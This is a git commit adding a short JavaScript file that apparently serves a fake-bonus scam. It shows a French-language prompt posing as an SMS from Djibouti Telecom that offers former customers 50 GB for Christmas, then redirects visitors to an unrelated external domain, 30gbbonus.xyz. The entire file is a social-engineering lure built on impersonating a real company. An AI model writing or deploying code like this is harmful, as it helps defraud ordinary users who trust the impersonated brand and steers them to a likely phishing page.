e3a2de1d028cd7a5f9e0b6814349a27568a13ec1
xmasdata <152927198+xmasdata@users.noreply.github.com>
2024-12-17 21:00:58 -0800

    Create djibouti-activation.js

---
+++ djibouti-activation.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVER 50 Go'
+password=prompt('SMS: Félicitations, vous êtes admissible à l'offre de Noël pour les anciens clients de Djibouti Telecom, veuillez appuyer sur OK pour activer vos 50 Go.   ','ACTIVER 50 Go');
+if (password != 'ACTIVER 50 Go') {
+location.href='https://30gbbonus.xyz/djibouti-telecom.html';
+}
